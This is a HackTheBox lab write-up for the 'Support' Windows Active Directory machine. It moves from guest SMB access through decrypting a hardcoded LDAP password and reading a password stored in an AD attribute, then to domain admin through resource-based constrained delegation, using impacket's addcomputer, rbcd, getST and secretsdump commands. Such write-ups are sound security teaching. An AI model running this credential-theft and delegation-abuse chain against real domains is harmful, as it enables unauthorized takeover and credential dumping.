# Support — HTB Write-up

**Author:** DonMorpheus (lab) + Ania  
**Machine:** Support (Easy, Windows / AD)  
**Domain:** `support.htb`  
**DC:** `dc.support.htb` (Windows Server 2022 Build 20348)  
**Scope:** HTB VPN / personal lab only  

> **No flags** in this document.

---

## TL;DR

| Phase | Vector |
|-------|--------|
| Recon | Classic AD ports; Host `DC`; domain `support.htb` |
| Access | SMB **null/guest**; share **`support-tools`** readable as guest |
| Creds 1 | Custom **UserInfo.exe** — LDAP bind password XOR-encrypted |
| Creds 2 | LDAP as `ldap` → attribute **`info`** on user `support` holds password |
| User shell | **WinRM** (`evil-winrm`) as `support` |
| Priv | `SeMachineAccountPrivilege` + MAQ=10; group **Shared Support Accounts** has **FullControl** on **`DC$`** |
| DA | Create computer account → write **RBCD** on `DC$` → `getST -impersonate Administrator` → dump / C$ |

---

## 1. Recon

```bash
nmap -sC -sV --top-ports 1000 <TARGET_IP>
# 53 DNS, 88 Kerberos, 135/139/445 SMB, 389/636 LDAP,
# 3268/3269 GC, 5985 WinRM, 9389 ADWS, high RPC
```

```bash
echo '<TARGET_IP> support.htb dc.support.htb' | sudo tee -a /etc/hosts
```

LDAP **RootDSE** answers anonymously (`dnsHostName=dc.support.htb`, functionality level 7). Domain searches require a successful bind.

---

## 2. SMB guest / support-tools

```bash
nxc smb support.htb -u 'guest' -p '' --shares
# support-tools  READ  "support staff tools"
# IPC$           READ
# NETLOGON/SYSVOL listed but guest list often denied
```

```bash
smbclient //support.htb/support-tools -U 'guest%' -c 'prompt OFF; recurse ON; mget *'
```

Contents are mostly portable utilities (7-Zip, Notepad++, PuTTY, Sysinternals, Wireshark) plus a custom package:

**`UserInfo.exe.zip`** → .NET tool `UserInfo.exe` + DLLs + `UserInfo.exe.config`.

Guest **lookupsid** also enumerates domain users/groups (including `ldap`, `support`, and multiple `firstname.lastname` accounts, group **Shared Support Accounts**).

---

## 3. UserInfo — LDAP password

Decompile `UserInfo.exe` (e.g. ILSpy / `ilspycmd`). Relevant logic:

- Bind DN style: `support\ldap` against `LDAP://support.htb`
- Password stored Base64, decrypted with:

```text
plaintext[i] = ciphertext[i] XOR key[i % key.Length] XOR 0xDF
key = ASCII("armando")
```

Ciphertext (static string in assembly):

```text
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
```

Helper: [`scripts/userinfo_decrypt.py`](scripts/userinfo_decrypt.py).

```bash
# verify domain login
nxc smb support.htb -u ldap -p '<DECRYPTED_PASSWORD>'
nxc ldap support.htb -u ldap -p '<DECRYPTED_PASSWORD>'
```

---

## 4. Password in AD attribute

Authenticated LDAP as `ldap`:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w '<LDAP_PASS>' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' sAMAccountName info description
```

The user **`support`** has a non-empty **`info`** field with a cleartext password (lab design).  

```bash
nxc smb support.htb -u support -p '<INFO_PASSWORD>'
nxc winrm support.htb -u support -p '<INFO_PASSWORD>'
# WinRM → (Pwn3d!)
```

```bash
evil-winrm -i support.htb -u support -p '<INFO_PASSWORD>'
# user desktop flag under C:\Users\support\Desktop\
```

---

## 5. Privilege picture (`support`)

```text
whoami /priv
  SeMachineAccountPrivilege   Add workstations to domain   Enabled
  SeChangeNotifyPrivilege     ...
  SeIncreaseWorkingSetPrivilege ...
```

Groups of interest:

- `BUILTIN\Remote Management Users` (WinRM)
- `SUPPORT\Shared Support Accounts` (only `support` in our run)

Domain:

```text
ms-DS-MachineAccountQuota: 10
```

No useful Kerberoast SPNs in default check. No admin tokens / juicy Windows privileges (no SeImpersonate potato path).

### ACL

On the computer object **`DC$`**:

```text
Trustee: Shared Support Accounts
Access:  FullControl
```

That is enough to write **`msDS-AllowedToActOnBehalfOfOtherIdentity`** (resource-based constrained delegation).

---

## 6. Domain Admin via RBCD

Concept:

1. **Create a machine account** (uses `SeMachineAccountPrivilege` / MAQ).  
2. As `support`, set RBCD so that machine may impersonate users **to `DC$`**.  
3. Request a service ticket as **Administrator** for `cifs/dc.support.htb` (S4U2Self + S4U2Proxy).  
4. Use the ticket for `secretsdump` or SMB access to Administrator’s desktop.

```bash
# 1) computer
impacket-addcomputer 'support.htb/support:<PASS>' -dc-ip <TARGET_IP> \
  -computer-name 'FAKEPC' -computer-pass 'Password123!'

# 2) RBCD write
impacket-rbcd -delegate-from 'FAKEPC$' -delegate-to 'DC$' -action write \
  -dc-ip <TARGET_IP> 'support.htb/support:<PASS>'

# 3) ticket
impacket-getST 'support.htb/FAKEPC$:Password123!' \
  -spn cifs/dc.support.htb -impersonate Administrator -dc-ip <TARGET_IP>

export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache

# 4) DA actions
impacket-secretsdump -k -no-pass dc.support.htb
impacket-smbclient -k -no-pass dc.support.htb
# → C$\Users\Administrator\Desktop\
```

Scripted flow: [`scripts/rbcd_to_da.sh`](scripts/rbcd_to_da.sh).

---

## 7. Takeaways

- Guest-readable **tool shares** are often the real foothold on “empty” AD boxes.  
- Custom internal utilities frequently hardcode service credentials.  
- Never ignore multi-valued / uncommon AD fields (`info`, `description`, `wwwHomePage`).  
- `SeMachineAccountPrivilege` alone is weak; combined with **write on a computer object’s RBCD attribute** it is Domain Admin.  
- Prefer Kerberos tickets over planting random DA passwords when the chain already yields ST.

---

## References

- [Resource-Based Constrained Delegation (RBCD)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)  
- Impacket: `addcomputer`, `rbcd`, `getST`, `secretsdump`  

---

## Disclaimer

Educational write-up for HackTheBox. Authorized lab use only.
